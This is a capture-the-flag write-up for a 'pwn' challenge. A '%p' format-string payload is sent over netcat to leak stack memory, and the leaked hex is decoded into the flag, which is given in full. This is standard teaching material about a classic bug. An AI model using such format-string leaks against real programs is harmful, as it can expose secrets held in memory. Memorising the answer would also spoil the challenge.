# Print a Card

- Category: `pwn`
- Challenge author: **Björn Österman**

## Description

Print that Santa

### Connection info

```sh
nc 2021.santahack.xyz 42001
```

## Writeup

When this program is run the flag is read from file and added to a local char-buffer variable that will then be stored on the stack.

printf allows you to send more specifiers then actual arguments used, making it possible to read data from the stack. Best way here is to use the %p which will read the value as a pointer with the same size as the architecture it is compiled for. In this case 64-bit (or 8 bytes)

you can specify 24 instances of the %p

```console
bjorn@LECOMPUTER:~/repos/iver_ctf_2021/challs/print_card$ nc 2021.santahack.xyz 42001
What is your elf name?
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
Wellcome 0x7ffcd6c2f0c00xffffffff(nil)0x9(nil)0x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x40000000a(nil)0x6e7b73616d7861680x5f6b636174735f6f0x5f737465726365730x6972705f6d6f72660x7d66746e(nil)(nil)0x7f5d80ce55c00x63f2a00x10x1
Let me print a card for you :-)

bjorn@LECOMPUTER:~/repos/iver_ctf_2021/challs/print_card$
```

Here you can se the actual string with the %p's (0x7025702570257025)*3
And then the 0x6e7b73616d7861680x5f6b636174735f6f0x5f737465726365730x6972705f6d6f72660x7d66746e
If you clean that up by removing the '0x' parts and reversing the pieces you get:
'7d66746e6972705f6d6f72665f737465726365735f6b636174735f6f6e7b73616d786168'
and the using 'pwn unhex' and 'rev':

```console
$ pwn unhex 7d66746e6972705f6d6f72665f737465726365735f6b636174735f6f6e7b73616d786168 | rev
haxmas{no_stack_secrets_from_printf}
```